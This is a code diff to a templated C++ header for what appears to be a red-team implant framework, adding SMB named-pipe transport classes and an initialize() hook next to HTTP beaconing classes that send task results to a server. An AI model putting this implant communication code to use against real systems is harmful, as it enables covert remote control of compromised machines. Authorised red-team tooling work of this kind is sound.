@@ -4,7 +4,7 @@
 #include <vector>
 #include "protocols/json/json.h"
 #include "core/settings.h"
-#include "comms/smb.h"
+#include "protocols/smb/smb.h"
 #include <optional>
 #include "modules/metadata.h"
 #include "comms/queues.h"
@@ -23,6 +23,8 @@ public:
 	// our "sleep" function, or what to wait for. 
 	// Universal for a sleep time, or someting like a pipe that waits
 	virtual HANDLE get_wait_handle() = 0;
+    //add an init function so each class can init itself if needed
+    virtual bool initialize() = 0;
 	//func to get our task
 	virtual nlohmann::json create_get_request(const std::string& uuid, bool full_metadata = false) = 0;
     virtual nlohmann::json get(std::string implant_uuid) = 0; 
@@ -72,21 +74,42 @@ protected:
 
 // Forward declarations of GET functions from comms.cpp
 
-[% for profile_name, ns in profile_mappings.items() %]
+[% for profile_name, profile in profile_mappings.items() %]
 
-namespace [[ ns ]] {
+
+namespace [[ profile.ns ]] {
     std::vector<uint8_t> get(std::vector<uint8_t> metadata_as_msgpack);
     int post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list);
 }
 
 [% endfor %]
 
+[% for profile_name, profile in profile_mappings.items() %]
+
 //Declare classes for each comms type
 
-[% for profile_name, ns in profile_mappings.items() %]
+//this wil need to get moved to its own per whatever impl...
 
+//if http....
+[% if profile.type == 'http' %]
 // GET for [[ profile_name ]]
-class [[ ns ]]_Ingress : public IIngressTransport {
+/*
+========================================================================
+HTTP / POLL-BASED EGRESS (Standard Beaconing)
+========================================================================
+If the active strategy is a standard network protocol (like HTTP),
+initialization is completely stateless and straightforward.
+
+Unlike Named Pipes/handle based methods, we do not need to manage persistent OS handles,
+worry about dead P2P links, or block waiting for a connection.
+
+We simply instantiate the transport class. The actual socket creation,
+HTTP transaction, and teardown will happen entirely on-the-fly inside
+the class whenever current_egress_->send_response() is called.
+========================================================================
+*/
+
+class [[ profile.ns ]]_Ingress : public IIngressTransport {
 public:
     //return NULL on non pipe/handle returning transport methods.
     //parent loop handles this by reverting to a wait for single, which waits
@@ -94,8 +117,12 @@ public:
     HANDLE get_wait_handle() override {
         return NULL;
     }
+    bool initialize() override {
+        // HTTP is stateless, so initialization always succeeds
+        return true;
+    }
 
-	nlohmann::json create_get_request(const std::string& uuid, bool full_metadata = false) override {
+    nlohmann::json create_get_request(const std::string& uuid, bool full_metadata = false) override {
         /*
         Creates the get task for THIS implant. 
         
@@ -114,7 +141,7 @@ public:
         metadata["implant_uuid"] = uuid;
         return metadata;
 
-	}
+    }
     nlohmann::json get(std::string implant_uuid) {
         /*
         Gathers all queued GET requests, and yeets them off to the server in an
@@ -144,7 +171,7 @@ public:
         get_as_msgpack = this->pack_to_msgpack(get_array);
 
         //send checkin
-        std::vector<uint8_t> response = [[ ns ]]::get(get_as_msgpack);
+        std::vector<uint8_t> response = [[ profile.ns ]]::get(get_as_msgpack);
 
         nlohmann::json task_array = nlohmann::json::array();
         if (!response.empty()) {
@@ -159,15 +186,91 @@ public:
 };
 
 // POST for [[ profile_name ]]
-class [[ ns ]]_Egress : public IEgressTransport {
+class [[ profile.ns ]]_Egress : public IEgressTransport {
 public:
-	void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
+    void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
         std::vector<uint8_t> task_response_msgpack_list = this->pack_to_msgpack(task_response_array);
 
-		[[ ns ]]::post(uuid, task_response_msgpack_list);
-	}
+        [[ profile.ns ]]::post(uuid, task_response_msgpack_list);
+    }
 };
 
+//if smb....
+[% elif profile.type == 'smb' %]
+
+class [[ profile.ns ]]_Ingress : public IIngressTransport {
+public:
+    // ZERO ARGUMENT CONSTRUCTOR!
+    [[ profile.ns ]]_Ingress() {}
+
+    bool initialize() override {
+        // Access handles directly from the namespace
+        if ([[ profile.ns ]]::h_inbox_pipe != INVALID_HANDLE_VALUE && [[ profile.ns ]]::h_outbox_pipe != INVALID_HANDLE_VALUE) {
+            DEBUG_LOG("[ [[ profile.ns ]]_Ingress ] SMB Ingress: Reusing existing pipe handles");
+            return true;
+        }
+
+        DEBUG_LOG("[!] GET pipe == INVALID_HANDLE_VALUE. Attempting registration...");
+        
+        if ([[ profile.ns ]]::h_outbox_pipe != INVALID_HANDLE_VALUE) {
+            DEBUG_LOG("[ [[ profile.ns ]]_Ingress ] Cleaning up lingering outbox pipe");
+            WinApi::CloseHandle([[ profile.ns ]]::h_outbox_pipe);
+            [[ profile.ns ]]::h_outbox_pipe = INVALID_HANDLE_VALUE;
+        }
+
+        // Call the zero-arg namespace function
+        if ([[ profile.ns ]]::register_pipe() != 0) {
+            DEBUG_LOG("[-] [ [[ profile.ns ]]_Ingress ] SMB Pipe Registration FAILED");
+            return false;
+        }
+
+        DEBUG_LOG("[ [[ profile.ns ]]_Ingress ] SMB Pipe Registration success.");
+        return true;
+    }
+
+    HANDLE get_wait_handle() override {
+        return NULL;
+    }
+
+    nlohmann::json create_get_request(const std::string& implant_uuid, bool full_metadata = false) override {
+        nlohmann::json metadata = nlohmann::json();
+        if (full_metadata) {
+            metadata = populate_metadata();
+        }
+        metadata["implant_uuid"] = implant_uuid;
+        return metadata;
+    }
+
+    nlohmann::json get(std::string implant_uuid) override {
+        nlohmann::json get_array = GetQueue::drain_queue();
+        get_array.push_back(this->create_get_request(implant_uuid, true));
+
+        std::vector<uint8_t> get_as_msgpack = this->pack_to_msgpack(get_array);
+
+        // Fetch using the namespace handles
+        std::vector<uint8_t> raw_response = SMB::Child::fetch_tasks([[ profile.ns ]]::h_inbox_pipe, [[ profile.ns ]]::h_outbox_pipe, get_as_msgpack);
+
+        if (!raw_response.empty()) {
+            return this->unpack_to_json(raw_response);
+        }
+
+        return nlohmann::json();
+    }
+};
+
+class [[ profile.ns ]]_Egress : public IEgressTransport {
+public:
+    // ZERO ARGUMENT CONSTRUCTOR!
+    [[ profile.ns ]]_Egress() {}
+
+    void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
+        std::vector<uint8_t> batched_data = this->pack_to_msgpack(task_response_array);
+
+        // Send using the namespace handle
+        SMB::Child::send_data([[ profile.ns ]]::h_outbox_pipe, batched_data);
+    }
+};
+[% endif %]
 
 [% endfor %]
 
